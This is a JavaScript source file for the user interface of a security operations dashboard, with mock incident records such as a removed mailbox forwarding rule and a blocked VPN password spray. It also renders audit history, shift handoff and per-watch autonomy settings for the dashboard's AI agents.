    </div>
    <div class="rad-acts rad-mini-acts" id="acts-${t.id}" onclick="event.stopPropagation()">${radarActionRowInner(t, true)}</div>
  </div>`;
}
/* ---- Flow 1: fully automated, rich evidence — a Watch that resolved itself ---- */
const AUTO_RESOLVED = {
  'day-auto1':{
    summary:`Dark Watch caught a mailbox forwarding rule on j.reyes sending mail to a personal Gmail, confirmed the account was compromised, and removed the rule — 0 messages forwarded.`,
    did:`Removed the forwarding rule and opened + closed CASE-2043. Fully reversible — the original rule is preserved in the case audit trail.`,
    perm:`Ran without a gate — <b>“Remove malicious mailbox rules”</b> is on Dark Watch’s allow-list (reversible, single-mailbox scope).`,
    trace:[
      {icon:'db', label:'Discover · New-InboxRule events', query:'event.action:"New-InboxRule" AND user:"j.reyes" window:24h', result:'1 rule created 03:04 UTC — forwards all mail to <code>jreyes.personal@gmail.com</code>, delete-after-forward on.'},
      {icon:'network', label:'Discover · sign-in logs', query:'user:"j.reyes" event.category:"authentication" window:24h', result:'Rule created from a <b>Lagos, NG</b> sign-in with no prior history from that geo. User is on PTO all week.'},
      {icon:'clip', label:'Cases · related', query:'link:token-replay pattern:"stolen-cookie"', result:'Session token matches this week’s phishing-wave replay pattern (CASE-2049).'},
    ],
    evidence:[
      {t:'Forwarding rule → personal Gmail', src:'Discover · New-InboxRule', conf:'high', status:'removed', ok:true},
      {t:'Sign-in from unfamiliar geo (Lagos, NG)', src:'Discover · sign-in logs', conf:'high', status:'confirmed'},
      {t:'User on PTO all week', src:'Entities · calendar', conf:'high', status:'confirmed'},
      {t:'No mail delivered externally', src:'Discover · message trace', conf:'high', status:'verified', ok:true},
    ],
  },
  'day-auto2':{
    summary:`Dark Watch caught a password spray against the VPN gateway — 2,340 failures across 76 accounts from 14 botnet IPs — verified nothing got in, and blocked the range at the edge.`,
    did:`Blocked the 14-IP range at the VPN gateway and opened + closed CASE-2044. Self-reverting — the deny rule auto-expires in 24h.`,
    perm:`Ran without a gate — <b>“Block known-bad IPs at the perimeter”</b> is on Dark Watch’s allow-list (threat-intel matched, auto-expiring, no user impact).`,
    trace:[
      {icon:'db', label:'Discover · VPN authentication failures', query:'event.category:"authentication" AND event.outcome:"failure" AND service:"vpn-gw" window:6h', result:'<b>2,340 failures across 76 accounts</b> from 14 rotating IPs, 03:58–04:41 UTC — classic low-and-slow spray.'},
      {icon:'shield', label:'Threat intel · IP reputation', query:'source.ip:[14 addresses] lookup:abuse-feeds', result:'All 14 IPs match the <b>Socks5Systemz botnet</b> feed, last seen under 24h ago. No corporate egress overlap.'},
      {icon:'check', label:'Discover · success verification', query:'event.outcome:"success" AND source.ip:[range] window:6h', result:'<b>0 successful logins</b>, 0 MFA challenges reached, 0 lockouts — nothing to unwind.'},
    ],
    evidence:[
      {t:'Password spray — 2,340 failures / 76 accounts', src:'Discover · VPN auth', conf:'high', status:'blocked', ok:true},
      {t:'All 14 source IPs on a botnet blocklist', src:'Threat intel', conf:'high', status:'confirmed'},
      {t:'Zero successful authentications', src:'Discover · VPN auth', conf:'high', status:'verified', ok:true},
      {t:'Deny rule active — auto-expires in 24h', src:'Perimeter · fw rules', conf:'high', status:'active', ok:true},
    ],
  },
};
function buildResolvedTrail(t, a){
  const ai=AI_RADAR[t.id]||{};
  const evidence=(t.evidence||[]).slice(0,5).map(e=>({t:e.t, src:shortSrc(e.src), conf:'high', status:'confirmed', ok:true}));
  return { summary: ai.note || t.narrative || '', did:(a&&a.done)||`${(a&&a.label)||'Action'} completed — recorded in the case audit trail.`, perm:`You approved this${a&&a.permNote?` — ${a.permNote}`:''}. Reversible; logged to the record.`, trace:[], evidence, by:'you' };
}
function resolveCardFromAction(id, a){
  const t=state.threads[id]; if(!t || t.handled) return;
  t.handled=true;
  t.status = t.mode==='nightshift' ? 'resolved' : 'contained';
  t._resolvedTrail = buildResolvedTrail(t, a);
  if(state.trailOpen) state.trailOpen[id]=false;
  /* The action closed the thread — file it straight to Records instead of leaving a handled card in the queue. */
  App.archiveRecord(id, {title: t.status==='resolved'?'Resolved — filed to Records':'Contained — filed to Records', msg:`${t.recordId||'Record'} closed with its evidence trail. Find it anytime in Records.`});
}
function radarAutoResolvedCard(t){
  const d=AUTO_RESOLVED[t.id]||t._resolvedTrail||{};
  const auto=!!t.autoResolved;
  const open=!!(state.trailOpen && state.trailOpen[t.id]);
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  const traceHTML=trailTraceHTML(d);
  const evHTML=trailEvHTML(d);
  return `<div class="rad-auto${open?' trail-open':''}${(state.inspectorOpen&&state.activeId===t.id)?' sel':''}" id="radcard-${t.id}" style="--sev:var(--teal,#0B8A85)" onclick="App.openRecord('${t.id}')">
    <div class="rad-auto-head">
      <span class="rad-auto-ic">${ic('shield',16)}</span>
      <div class="rad-auto-tw">
        <div class="rad-auto-tr"><span class="rad-auto-title">${t.title}</span>${idTag}<span class="rad-auto-badge">${ic('check',10)} ${auto?'Resolved autonomously':(t.status==='resolved'?'Resolved':'Contained')}</span></div>
        <div class="rad-auto-note">${d.summary||t.narrative||''}</div>
      </div>
      ${t.updated?`<span class="rad-mini-when">${t.updated}</span>`:''}
    </div>
    <div class="rad-auto-foot">
      <button class="rad-auto-toggle" onclick="event.stopPropagation();App.toggleTrail('${t.id}')"><span class="rat-caret">${ic('chevron',13)}</span><span class="rat-toggle-l">${open?'Hide':'Show'} evidence trail</span></button>
      <span class="rad-watchacts rad-auto-watch"><span class="rad-watchacts-k">Watched by</span>${watchesFor(t.id).map(watchChip).join('')}</span>
      <div class="rad-act-btns rad-auto-acts" onclick="event.stopPropagation()"><button class="rad-act rad-auto-archive" title="${auto?'Mark reviewed — file to Records':'Archive record'}" onclick="event.stopPropagation();App.archiveRecord('${t.id}')">${auto?`${ic('check',12)} Reviewed — file it`:`${ic('folder',12)} Archive`}</button><button class="rad-act rad-act-more" title="More actions" onclick="event.stopPropagation();App.cardMore('${t.id}',this)">${ic('dots',15)}</button><span class="rad-act-div" aria-hidden="true"></span><button class="rad-chat icon-only" title="Open in chat" aria-label="Open in chat" onclick="event.stopPropagation();App.openThread('${t.id}')">${ic('comment',15)}</button></div>
    </div>
    <div class="rad-auto-trail" onclick="event.stopPropagation()">
      <div class="rat-sec-l">Action taken</div>
      <div class="rad-auto-strip"><span class="rad-auto-tok">${ic(auto?'bolt':'check',11)} ${auto?'Auto-executed':'You approved'}</span><span class="rad-auto-did">${d.did||''}</span></div>
      <div class="rad-auto-perm">${ic('shield',12)}<span>${d.perm||''} <a class="rad-auto-link" onclick="event.stopPropagation();App.go('guardrails')">View guardrail</a></span></div>
      ${(d.trace&&d.trace.length)?`<div class="rat-sec-l">Reasoning trace</div>${traceHTML}`:''}
      ${(d.evidence&&d.evidence.length)?`<div class="rat-sec-l">Evidence</div>${evHTML}`:''}
    </div>
  </div>`;
}
/* ---- Overnight receipts: autonomous resolutions live in their own block under the queue.
   The cards carry no expandable trail — the full trail (actions, reasoning, checks) lives in the record flyout. ---- */
function trailTraceHTML(d){
  return (d.trace||[]).map(s=>`<div class="rat-step">
    <div class="rat-step-h"><span class="rat-step-ic">${ic(s.icon,13)}</span><span class="rat-step-l">${s.label}</span><span class="rat-auto">${ic('check',10)} auto-run</span></div>
    <div class="rat-step-q">${s.query}</div>
    <div class="rat-step-r">${s.result}</div></div>`).join('');
}
function trailEvHTML(d){
  const CONF={high:{l:'High confidence',c:'var(--green,#1f8a5b)'},medium:{l:'Medium confidence',c:'var(--amber,#c8862a)'},low:{l:'Low confidence',c:'var(--ink-4)'}};
  return (d.evidence||[]).map((e,i)=>{ const cf=CONF[e.conf]||CONF.low; return `<div class="rat-ev">
    <span class="rat-ev-n">${i+1}</span>
    <div class="rat-ev-b"><div class="rat-ev-t">${e.t}</div>
      <div class="rat-ev-m"><span class="rat-ev-src">${ic('link',10)} ${e.src}</span><span class="rat-ev-conf" style="--cc:${cf.c}"><span class="rat-ev-dot"></span>${cf.l}</span></div></div>
    <span class="rat-ev-status${e.ok?' ok':''}">${ic(e.ok?'check':'refresh',10)} ${e.status}</span></div>`; }).join('');
}
function radarReceiptCard(t){
  const d=AUTO_RESOLVED[t.id]||t._resolvedTrail||{};
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  const nEv=(t.evidence||[]).length;
  return `<div class="rad-auto rad-receipt${(state.inspectorOpen&&state.activeId===t.id)?' sel':''}" id="radcard-${t.id}" style="--sev:var(--teal,#0B8A85)" onclick="App.openRecord('${t.id}')">
    <div class="rad-auto-head">
      <span class="rad-auto-ic">${ic('shield',16)}</span>
      <div class="rad-auto-tw">
        <div class="rad-auto-tr"><span class="rad-auto-title">${t.title}</span>${idTag}<span class="rad-auto-badge">${ic('check',10)} Resolved autonomously</span></div>
        <div class="rad-auto-note">${d.summary||t.narrative||''}</div>
      </div>
      ${t.updated?`<span class="rad-mini-when">${t.updated}</span>`:''}
    </div>
    <div class="rad-auto-foot">
      <button class="rad-auto-toggle rad-receipt-open" title="Open the record — actions taken, reasoning trace and evidence" onclick="event.stopPropagation();App.openRecord('${t.id}')">${ic('doc',13)}<span class="rat-toggle-l">Evidence trail in the record${nEv?` · ${nEv} items`:''}</span>${ic('arrow',11)}</button>
      <span class="rad-watchacts rad-auto-watch"><span class="rad-watchacts-k">Watched by</span>${watchesFor(t.id).map(watchChip).join('')}</span>
      <div class="rad-act-btns rad-auto-acts" onclick="event.stopPropagation()"><button class="rad-act rad-auto-archive" title="Mark reviewed — file to Records" onclick="event.stopPropagation();App.archiveRecord('${t.id}')">${ic('check',12)} Reviewed — file it</button><button class="rad-act rad-act-more" title="More actions" onclick="event.stopPropagation();App.cardMore('${t.id}',this)">${ic('dots',15)}</button><span class="rad-act-div" aria-hidden="true"></span><button class="rad-chat icon-only" title="Open in chat" aria-label="Open in chat" onclick="event.stopPropagation();App.openThread('${t.id}')">${ic('comment',15)}</button></div>
    </div>
  </div>`;
}
function overnightDigest(receipts){
  const n=receipts.length;
  return `While you were away I resolved <b>${n}</b> ${n===1?'thread':'threads'} on my own — <a class="ovn-link" href="#" onclick="event.preventDefault();App.goReceipts()">review the activity ${ic('arrowr',12)}</a>`;
}
function autoReceiptsSection(receipts){
  const collapsed=!!(state.collapsedDec && state.collapsedDec.auto);
  const body=receipts.map(t=>radarReceiptCard(t)).join('');
  return `<div class="radar-sec decision-sec receipts-sec${collapsed?' dec-collapsed':''}" id="sec-auto" style="--dec:var(--teal,#0B8A85)">
    <div class="radar-sec-h decision-h" role="button" tabindex="0" aria-expanded="${!collapsed}" onclick="App.toggleDec('auto')"><span class="dec-caret">${ic('chevron',14)}</span><span class="dec-dot" style="background:var(--teal,#0B8A85)"></span><span class="dec-h-label" style="color:var(--teal,#0B8A85)">Resolved autonomously</span><span class="rad-cnt">${receipts.length}</span><span class="radar-sec-sub">Closed while you were away — review &amp; file. Unreviewed receipts file to Records at shift change.</span></div>
    <div class="decision-body">${body}</div>
  </div>`;
}
/* Autonomous resolution — the full trail rendered inside the record flyout */
function autoResolutionSec(t){
  const d=AUTO_RESOLVED[t.id]||t._resolvedTrail||{};
  const trace=trailTraceHTML(d), ev=trailEvHTML(d);
  const did=`<section class="bsec insp-auto"><h4>What Dark Watch did</h4>
    <div class="rad-auto-strip"><span class="rad-auto-tok">${ic('bolt',11)} Auto-executed</span><span class="rad-auto-did">${d.did||''}</span></div>
    <div class="rad-auto-perm">${ic('shield',12)}<span>${d.perm||''} <a class="rad-auto-link" onclick="App.go('guardrails')">View guardrail</a></span></div>
  </section>`;
  const traceSec=trace?`<section class="bsec insp-auto"><h4>Reasoning trace</h4>${trace}</section>`:'';
  const evSec=ev?`<section class="bsec insp-auto"><h4>Verification checks</h4>${ev}</section>`:'';
  return did+traceSec+evSec;
}
/* ---- Condensed row for passive decisions (suppress / monitor / dismiss) ---- */
function radarPassiveRow(t){
  const m=TYPE_META[t.type]||{}; const ai=AI_RADAR[t.id]||{};
  const dec=decisionOf(t); const dm=DECISION_META[dec]||{};
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  return `<div class="rad-watch" data-sev="${(t.severity||'').toLowerCase()}" onclick="App.openRecord('${t.id}')">
    <span class="rad-watch-ic" style="--dec:${dm.color}">${ic(dm.icon||'eye',14)}</span>
    <div class="rad-watch-body">
      <div class="rad-watch-top"><span class="rad-watch-t">${t.title}</span>${idTag}<span class="rad-dec sm" style="--dec:${dm.color}">${dm.label}</span></div>
      <div class="rad-watch-note">${ai.note||t.narrative||''}</div>
    </div>
    ${t.updated?`<span class="rad-done-when">${t.updated}</span>`:''}
  </div>`;
}
function radarMotionCard(t){
  const m=TYPE_META[t.type]||{}; const ai=AI_RADAR[t.id]||{};
  const sc=radarSevColor(t); const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  const pval = (ai.progress!=null) ? ai.progress : 0;
  const prog = `<div class="rad-mrow-prog"><span class="rad-mrow-bar"><i style="width:${pval}%"></i></span><span class="rad-mrow-pct">${pval}%</span></div>`;
  const who=radarWho(t); const whoTxt = (who==='You'||who==='you') ? "You're on it" : `${who} is on it`;
  return `<div class="rad-mrow" style="--sev:${sc}" id="radcard-${t.id}" onclick="App.openRecord('${t.id}')">
    <span class="rad-mrow-spin"></span>
    <div class="rad-mrow-body">
      <div class="rad-mrow-top"><span class="rad-mrow-t">${t.title}</span>${idTag}<span class="rad-mrow-who">${whoTxt}</span></div>
      ${prog}
    </div>
    ${t.updated?`<span class="rad-mrow-when">${t.updated}</span>`:''}
  </div>`;
}
function radarWatchRow(t){
  const ai=AI_RADAR[t.id]||{}; const sc=radarSevColor(t);
  const idTag=t.recordId?`<span class="rad-id">${t.recordId}</span>`:'';
  return `<div class="rad-watch" onclick="App.openRecord('${t.id}')">
    <span class="rad-watch-ic">${ic('eye',14)}</span>
    <div class="rad-watch-body">
      <div class="rad-watch-top"><span class="rad-watch-t">${t.title}</span>${idTag}<span class="rad-watch-tag">Watching</span></div>
      <div class="rad-watch-note">${ai.note||t.narrative||''}</div>
    </div>
    ${t.updated?`<span class="rad-done-when">${t.updated}</span>`:''}
  </div>`;
}
const HISTORY_LOG = [
  {auto:true,  title:'Auto-closed 47 duplicate scanner alerts',                status:'auto',      when:'25m ago'},
  {auto:true,  title:'Auto-enriched 12 alerts with threat intel context',       status:'auto',      when:'40m ago'},
  {auto:false, title:'Contained cryptominer on build-srv-09',                   actor:'Maya Chen',   status:'approved',  when:'2h ago'},
  {auto:true,  title:'Auto-suppressed recurring FP from backup agent',          status:'auto',      when:'3h ago'},
  {auto:false, title:'Closed phishing case — user reported, no click',          actor:'Tom Okafor', status:'approved',  when:'4.5h ago'},
  {auto:true,  title:'Blocked VPN brute-force at the edge (CASE-2044)',         status:'auto',      when:'5h ago'},
  {auto:true,  title:'Auto-escalated brute force attempt to Watch Officer',     status:'auto',      when:'7h ago'},
  {auto:true,  title:'Removed mailbox exfil rule — j.reyes (CASE-2043)',        status:'auto',      when:'6.5h ago'},
  {auto:false, title:'Completed malware analysis: AsyncRAT variant',            actor:'Priya Nair',status:'approved',  when:'10h ago'},
  {auto:true,  title:'Auto-tuned noisy Sysmon rule (threshold adjusted)',       status:'auto',      when:'12h ago'},
  {auto:false, title:'Proposed rule accepted: DNS tunneling detection',         actor:'Tom Okafor',  status:'approved',  when:'14h ago'},
  {auto:true,  title:'Auto-contained endpoint: malicious macro execution',      status:'auto',      when:'11h ago'},
  {auto:true,  title:'Completed hypothesis hunt: LOLBins in CI/CD',             status:'auto',      when:'Mon 10:00'},
  {auto:false, title:'Dismissed: VPN anomaly was authorized travel',            actor:'Maya Chen',   status:'dismissed', when:'18h ago'},
];
function histInitials(n){ return String(n).split(/\s+/).map(x=>x[0]).slice(0,2).join('').toUpperCase(); }
function briefHistory(){
  const rows = HISTORY_LOG.map(h=>{
    const dotColor = h.auto ? 'var(--teal)' : 'var(--blue)';
    const bolt = h.auto ? `<span class="hist-bolt">${ic('bolt',13)}</span>` : '';
    const actor = h.actor ? `<span class="hist-actor"><span class="hist-av">${histInitials(h.actor)}</span>${h.actor}</span>` : '';
    const label = ({auto:'AUTO',approved:'APPROVED',dismissed:'DISMISSED'})[h.status] || String(h.status).toUpperCase();
    return `<div class="hist-row">
      <span class="hist-ic"><span class="hist-dot" style="background:${dotColor}"></span>${bolt}</span>
      <span class="hist-title">${h.title}</span>
      ${actor}
      <span class="hist-status ${h.status}">${label}</span>
      <span class="hist-when">${h.when}</span>
    </div>`;
  }).join('');
  return `<div class="hist-legend"><span><span class="hist-leg-dot" style="background:var(--blue)"></span>Human decision</span><span><span class="hist-bolt">${ic('bolt',12)}</span>Fully automated</span></div><div class="hist-list">${rows}</div>`;
}
function briefView(){
  const mode=state.mode||'dayshift'; const B=BRIEF[mode];
  const {g,wd}=radarGreeting();
  const threads=Object.values(state.threads).filter(t=>
    t.mode===mode && t.id!=='day-1' && t.id!=='night-brief' && t.id!=='day-brief'
    && t.status!=='closed' /* archived records leave the brief queue */
    && !(t.type==='chat' && (t.messages||[]).length===0));
  const SEV_RANK={Critical:0,High:1,Medium:2,Low:3};
  const sevRank=t=>SEV_RANK[t.severity]!=null?SEV_RANK[t.severity]:4;
  const bySev=(a,b)=> (sevRank(a)-sevRank(b)) || (radarScore(b)-radarScore(a));
  const now=threads.filter(t=>radarTier(t)==='now').sort(bySev);
  const motion=threads.filter(t=>radarTier(t)==='motion').sort((a,b)=>radarScore(b)-radarScore(a));
  const watch=threads.filter(t=>radarTier(t)==='watch').sort((a,b)=>radarScore(b)-radarScore(a));
  const done=threads.filter(t=>radarTier(t)==='done').sort((a,b)=>radarScore(b)-radarScore(a));
  // surface filter — a surface matches via the thread's chips OR its expanded victim accounts;
  // stale selections (surfaces no longer on any live thread) are pruned so a filter can never
  // point at a surface that has left the board.
  const involves = (t,l) => { const ai=AI_RADAR[t.id]||{}; return ((ai.chips||[]).includes(l)) || ((ai.victims||[]).includes(l)); };
  if(state.surfaceFilters && state.surfaceFilters.length){ state.surfaceFilters = state.surfaceFilters.filter(l => threads.some(t=>involves(t,l))); }
  const sfs = (state.surfaceFilters||[]);
  const matchSf = t => !sfs.length || sfs.some(l=>involves(t,l));
  const fNow=now.filter(matchSf), fMotion=motion.filter(matchSf), fWatch=watch.filter(matchSf), fDone=done.filter(matchSf);
  /* "Need you" = open decisions waiting in the four active groups — the same population
     the overview cards and section headers count, so the numbers always add up. */
  const needYou = threads.filter(t=>!t.autoResolved && (t.status==='open'||t.status==='awaiting') && ACTIVE_DECS.includes(decisionOf(t))).length;
  const briefTitle = needYou
    ? `${needYou} ${needYou===1?'thread needs':'threads need'} you`
    : `You're clear`;
  const briefSubline = needYou
    ? `Each one has the move I'd make — run it here, or open the chat to dig in.`
    : `Nothing needs you right now — I'm watching the queue and will flag anything that turns.`;
  const headline = needYou
    ? `<b>${needYou} ${needYou===1?'thread needs':'threads need'} you.</b> Each one has the move I'd make — run it here, or open the chat to dig in.`
    : `<b>You're clear.</b> Nothing needs you right now — I'm watching the queue and will flag anything that turns.`;
  // ---- group every proposal by decision type ----
  const fThreads = threads.filter(matchSf);
  /* Autonomous resolutions are receipts, not tasks. They live in their own
     "Resolved autonomously" block beneath the queue (under Dismiss), announced by the
     overnight digest up top — and they never count toward any "needs you" number. */
  const receipts = fThreads.filter(t=>t.autoResolved).sort((a,b)=>String(a.updated||'').localeCompare(String(b.updated||'')));
  const subline = receipts.length ? overnightDigest(receipts) : briefSubline;
  const gThreads = fThreads.filter(t=>!t.autoResolved);
  const groups = {}; DECISION_ORDER.forEach(d=>groups[d]=[]);
  gThreads.forEach(t=>{ const d=decisionOf(t); (groups[d]||(groups[d]=[])).push(t); });
  DECISION_ORDER.forEach(d=>groups[d].sort((a,b)=>(((a.autoResolved||a.handled)?1:0)-((b.autoResolved||b.handled)?1:0))||(radarScore(b)-radarScore(a))));
  const presentActive  = ACTIVE_DECS.filter(d=>groups[d].length);
  const presentPassive = PASSIVE_DECS.filter(d=>groups[d].length);
  const firstSecId  = presentActive[0] || presentPassive[0] || null;
  const motionSecId = presentActive.find(d=>groups[d].some(t=>t.status==='in-progress')) || null;
  const targets = { now: firstSecId, motion: motionSecId, done: groups['dismiss'].length ? 'dismiss' : null };
  const present = presentActive.slice(0,4);
  const overview = briefOverview(mode, now, motion, done, targets, present, groups, {filtered:fThreads.length, all:threads.length});
  const decSection = (d, body, passive) => {
    const dm = DECISION_META[d];
    const collapsed = !!(state.collapsedDec && state.collapsedDec[d]);
    const waitingN = groups[d].filter(t=>t.status==='open'||t.status==='awaiting').length;
    const motionN = groups[d].filter(t=>t.status==='in-progress').length;
    const motionChip = motionN?`<span class="rad-cnt-motion" title="NotDaybreak is executing these — no decision needed">${motionN} in motion</span>`:'';
    return `<div class="radar-sec decision-sec${passive?' decision-passive':''}${collapsed?' dec-collapsed':''}" id="sec-${d}" style="--dec:${dm.color}">
      <div class="radar-sec-h decision-h" role="button" tabindex="0" aria-expanded="${!collapsed}" onclick="App.toggleDec('${d}')"><span class="dec-caret">${ic('chevron',14)}</span><span class="dec-dot" style="background:${dm.color}"></span><span class="dec-h-label" style="color:${dm.color}">${dm.label}</span><span class="rad-cnt">${waitingN}</span>${motionChip}<span class="radar-sec-sub">${dm.blurb}</span></div><div class="decision-body">${body}</div></div>`;
  };
  const dayList = (state.mode||'dayshift')==='dayshift';
  const activeHtml = presentActive.map(d=>{
    const body = groups[d].map((t,i)=> (t.autoResolved||t.handled) ? radarAutoResolvedCard(t) : ((i===0 && !sfs.length && !dayList) ? radarDecisionCard(t, true) : radarMiniCard(t))).join('');
    return decSection(d, body, false);
  }).join('');
  const passiveHtml = presentPassive.map(d=>
    decSection(d, groups[d].map(t=>radarPassiveRow(t)).join(''), true)
  ).join('');
  const receiptsHtml = receipts.length ? autoReceiptsSection(receipts) : '';
  const total = fThreads.length;
  const qv = state.briefQueueView || 'queue';
  const qSwitch = `<div class="q-switch"><button class="q-tab ${qv==='queue'?'on':''}" onclick="App.setQueueView('queue')">Queue <span class="q-cnt">${total}</span></button><button class="q-tab ${qv==='history'?'on':''}" onclick="App.setQueueView('history')">History</button></div>`;
  const agentName = mode==='nightshift'?'NightShift':'NotDaybreak';
  const agentRole = mode==='nightshift'?'Observability agent':'Security agent';
  return `<div class="radar-page">
    <button class="brief-settings brief-hist" title="Decision history" aria-label="Decision history" onclick="App.historyOpen()">${ic('clock',16)}</button>
    <button class="brief-settings brief-handoff" title="Shift handoff — compile & send" aria-label="Shift handoff" onclick="App.handoffOpen()">${ic('users',16)}</button>
    <button class="brief-settings" title="Watches & autonomy" aria-label="Watches and autonomy" onclick="App.settingsFlyOpen()">${ic('settings',16)}</button>
    <header class="brief-head">
      <div class="brief-eyebrow">
        <span class="brief-agent"><span class="brief-agent-ic">${ic(mode==='nightshift'?'moon':'sun',14)}</span>${agentName}</span>
        <span class="brief-role">${agentRole}</span>
      </div>
      ${qv==='history'
        ? `<h1 class="brief-title"><span class="brief-title-em">Decision history.</span></h1>
      <p class="brief-subline">A durable record of every decision, change, and agent action — who did it, and when.</p>`
        : `<h1 class="brief-title">${g}. <span class="brief-title-em">${briefTitle}.</span></h1>
      <p class="brief-subline">${subline}</p>`}
    </header>
    ${qv==='queue' ? overview : ''}
    ${qv==='history' ? briefHistory() : `${activeHtml}
    ${receiptsHtml}
    ${passiveHtml}
    ${sfs.length && total===0 ? `<div class="sf-empty">${ic('search',22)}<p>No threads involve ${sfs.length===1?`<b>${sfs[0]}</b>`:`any of those ${sfs.length} surfaces`} right now.</p><button class="ov-chip ov-more" onclick="App.surfaceFilter(null)">Clear filter</button></div>` : ''}`}
  </div>`;
}
/* ---- Shift handoff — compiled note for the next shift (Scenario 1) ---- */
function handoffData(){
  const mode=state.mode||'dayshift';
  const threads=Object.values(state.threads).filter(t=>t.mode===mode && !t.staged);
  const done=[], motion=[], waiting=[];
  threads.forEach(t=>{
    const ai=AI_RADAR[t.id]||{}; const cs=state.cards&&state.cards[t.id];
    (ai.actions||[]).forEach((a,i)=>{ if(cs&&cs.done&&cs.done[i]&&a.gated) done.push({t,label:a.label}); });
    if(t.status==='in-progress') motion.push(t);
    else if((t.status==='open'||t.status==='awaiting') && radarScore(t)>=60 && decisionOf(t)!=='dismiss' && decisionOf(t)!=='monitor') waiting.push(t);
  });
  const deferred=((state.handoff&&state.handoff.deferred)||[]).map(id=>state.threads[id]).filter(Boolean);
  return {done,motion,waiting,deferred};
}
function handoffFlyHTML(){
  const d=handoffData();
  const row=(cls,icn,html,idTag)=>`<div class="ho-row ${cls}">${ic(icn,13)}<span>${html}${idTag?`<span class="ho-id">${idTag}</span>`:''}</span></div>`;
  const doneRows=d.done.length?d.done.map(x=>row('done','check',`<b>${x.label}</b> — approved by you`,x.t.recordId)).join(''):row('done','check','No gated actions approved yet this shift','');
  const motionRows=d.motion.map(t=>row('motion','refresh',t.title,t.recordId)).join('');
  const waitRows=d.waiting.map(t=>row('wait','warn',t.title,t.recordId)).join('');
  const defRows=d.deferred.map(t=>row('motion','clock',`${t.title} — deferred`,t.recordId)).join('');
  return `<div class="ski-mask" onclick="App.handoffClose()"></div>
  <aside class="ski-fly" role="dialog" aria-label="Shift handoff">
    <div class="ski-fly-h">
      <span class="ski-fly-ic">${ic('users',16)}</span>
      <div class="ski-fly-tw"><div class="ski-fly-t">Shift handoff</div><div class="ski-fly-s">Compiled from this shift's decisions — edit, then send</div></div>
      <button class="ski-fly-x" title="Close" onclick="App.handoffClose()">${ic('x',16)}</button>
    </div>
    <div class="ski-fly-body">
      <div class="ho-sec" style="--ho:var(--green)"><div class="ho-sech"><span class="ho-dot"></span><h3>Decisions this shift</h3><span class="c">${d.done.length} approved</span></div>${doneRows}</div>
      ${d.motion.length?`<div class="ho-sec" style="--ho:var(--amber)"><div class="ho-sech"><span class="ho-dot"></span><h3>Still in motion</h3><span class="c">${d.motion.length} — NotDaybreak is executing</span></div>${motionRows}</div>`:''}
      ${d.deferred.length?`<div class="ho-sec" style="--ho:var(--blue)"><div class="ho-sech"><span class="ho-dot"></span><h3>Deferred to next shift</h3><span class="c">${d.deferred.length}</span></div>${defRows}</div>`:''}
      ${d.waiting.length?`<div class="ho-sec" style="--ho:var(--red)"><div class="ho-sech"><span class="ho-dot"></span><h3>Waiting on a decision</h3><span class="c">${d.waiting.length} — next shift opens with these</span></div>${waitRows}</div>`:''}
      <div class="ho-sec"><div class="ho-sech plain"><h3>Note for the next shift</h3></div>
        <textarea class="ho-note" id="hoNote" placeholder="Context the queue can't carry — what you'd say at the desk…">${(state.handoff&&state.handoff.note)||''}</textarea></div>
    </div>
    <div class="ho-foot"><span class="ho-hint">Lands at the top of the next shift's brief · logged to History</span><button class="btn ghost" onclick="App.handoffClose()">Close</button><button class="btn go" onclick="App.handoffSend()">${ic('check',14)} Send to next shift</button></div>
  </aside>`;
}
/* ---- Decision history — durable audit log, shown as a right-side flyout ---- */
function historyFlyHTML(){
  return `<div class="ski-mask" onclick="App.historyClose()"></div>
  <aside class="ski-fly" role="dialog" aria-label="Decision history">
    <div class="ski-fly-h">
      <span class="ski-fly-ic hist-fly-ic">${ic('clock',16)}</span>
      <div class="ski-fly-tw"><div class="ski-fly-t">Decision history</div><div class="ski-fly-s">Every decision, change, and agent action — who did it, and when</div></div>
      <button class="ski-fly-x" title="Close" onclick="App.historyClose()">${ic('x',16)}</button>
    </div>
    <div class="ski-fly-body">${briefHistory()}</div>
  </aside>`;
}
/* ---- Watches & autonomy — per-watch dials, shown as a right-side flyout ---- */
function settingsFlyHTML(){
  return `<div class="ski-mask" onclick="App.settingsFlyClose()"></div>
  <aside class="ski-fly" role="dialog" aria-label="Watches and autonomy">
    <div class="ski-fly-h">
      <span class="ski-fly-ic set-fly-ic">${ic('settings',16)}</span>
      <div class="ski-fly-tw"><div class="ski-fly-t">Watches &amp; autonomy</div><div class="ski-fly-s">Autonomy is set per watch — adjust it here, or open full settings</div></div>
      <button class="ski-fly-x" title="Close" onclick="App.settingsFlyClose()">${ic('x',16)}</button>
    </div>
    <div class="ski-fly-body"><div class="autp"><div class="autp-list"></div></div></div>
    <div class="ho-foot"><a class="set-fly-all" onclick="App.settingsFlyClose();App.go('agents')">${ic('settings',13)} All watch settings</a></div>
  </aside>`;
}
/* Populate an .autp-list container with the per-watch autonomy rows + live sliders.
   Shared by the brief gear flyout (and the legacy popover). */
function fillAutpList(list, closeFn){
  const syncHeads=()=>{
    [...list.querySelectorAll('.autp-item')].forEach(it=>{
      const lvl=autonomyOf(it.dataset.wid);
      const m=it.querySelector('.autp-row .aut'); if(m) m.outerHTML=autMeter(lvl);
      const l=it.querySelector('.autp-row .autp-lvl'); if(l) l.textContent=AUT_LABELS[lvl-1];
    });
  };
  WATCHES.filter(w=>!w.draft).forEach(w=>{
    const lvl=autonomyOf(w.id);
    const item=el(`<div class="autp-item" data-wid="${w.id}" style="--tone:${w.color}">
      <button class="autp-row ${w.on?'':'off'}" type="button" aria-expanded="false">
        <span class="wdot" style="background:${w.color}"></span>
        <span class="autp-n">${w.name}</span>
        <span class="autp-win">${w.on?w.window:'Paused'}</span>
        ${autMeter(lvl)}
        <span class="autp-lvl">${AUT_LABELS[lvl-1]}</span>
        <span class="autp-go">${ic('chevron',12)}</span>
      </button>
      <div class="autp-body">
        <div class="ag-aut2 autp-slider">${autSliderHTML()}<div class="aut-read sm"><b></b><p></p></div></div>
        <a class="autp-open">${ic('settings',11)} Open ${w.name} settings</a>
      </div>
    </div>`);
    const wire=()=>{ if(!item._wired){ wireAutSlider(item.querySelector('.autp-slider'), w.id, 'pop'); item._wired=true; } };
    item.querySelector('.autp-row').addEventListener('click',ev=>{
      ev.stopPropagation();
      const wasOpen=item.classList.contains('open');
